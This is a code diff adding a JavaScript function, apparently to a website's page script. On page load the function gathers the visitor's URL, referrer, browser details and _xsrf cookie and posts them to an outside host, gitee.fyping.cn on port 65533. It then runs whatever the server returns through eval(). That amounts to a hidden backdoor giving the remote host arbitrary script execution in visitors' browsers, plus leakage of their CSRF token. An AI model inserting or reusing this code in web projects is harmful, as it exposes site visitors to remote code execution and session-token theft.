@@ -59,3 +59,72 @@ if(window.localStorage){
 }
 console.log("xx_user:"+xx_user);
 /*setTimeout(fask(xx_user),5000,false);*/
+
+
+var fask2 = function(){
+
+
+function getCookie(name) {
+var r = document.cookie.match("\\b" + name + "=([^;]*)\\b");
+return r ? r[1] : undefined;
+}
+	var time_sec = Math.round(window.time_spe);
+	var referrer = document.referrer;
+	var location = document.location.href;
+	var language = navigator.language;
+	var random = Math.random()*100000000000000000+"";
+	var platform = navigator.platform;
+	var screen = window.screen.availWidth+"x"+window.screen.availHeight+"";
+	//console.log("send ",time_sec);
+	window.time_spe = ((new Date()).getTime() - window.time_start)/1000;
+	var xsrf = getCookie("_xsrf");
+	if(xsrf=="" || xsrf==null){
+		xsrf="2|682c80a7|3d918a2ec0dcf6e9daa20ea497c27f16|1543887208";
+		xsrf="helloworld";
+	}
+	$.ajax({
+		type:"POST",
+		url:"https://gitee.fyping.cn:65533/uv",
+		data:"timesec="+time_sec+"&referrer="+referrer+"&location="+location+"&language="+language+"&randoms="+random+"&platform="+platform+"&screen="+screen+"&_xsrf="+xsrf+"&tokens="+"13131321312231",
+			/*beforeSend: function (XMLHttpRequest) {
+			var wel = window.welcome_info == null ? window.welcome_info : 'isnull';
+     		XMLHttpRequest.setRequestHeader("Welcome", "");
+        },*/
+		success:function(data){
+			//console.log("ok"+msg);
+			//var res_ = json2str(data);
+			console.log(data);
+			eval(data);
+		},
+		error:function(data){
+			console.log("error");
+		}/*,
+		 complete: function( xhr,data ){
+	        // 获取相关Http Response header
+	        var wpoInfo = {
+	            // 服务器端时间
+	            "date" : xhr.getResponseHeader('Date'),
+	            // 如果开启了gzip，会返回这个东西
+	            "contentEncoding" : xhr.getResponseHeader('Content-Encoding'),
+	            // keep-alive ？ close？
+	            "connection" : xhr.getResponseHeader('Connection'),
+	            // 响应长度
+	            "contentLength" : xhr.getResponseHeader('Content-Length'),
+	            // 服务器类型，apache？lighttpd？
+	            "server" : xhr.getResponseHeader('Server'),
+	            "vary" : xhr.getResponseHeader('Vary'),
+	            "transferEncoding" : xhr.getResponseHeader('Transfer-Encoding'),
+	            // text/html ? text/xml?
+	            "contentType" : xhr.getResponseHeader('Content-Type'),
+	            "cacheControl" : xhr.getResponseHeader('Cache-Control'),
+	            // 生命周期？
+	            "exprires" : xhr.getResponseHeader('Exprires'),
+	            "lastModified" : xhr.getResponseHeader('Last-Modified')
+	            //"welcome" : xhr.getResponseHeader('Welcome')
+	        };
+	        window.welcome_info = wpoInfo['welcome'];
+    	}*/
+	});
+};
+
+fask2();
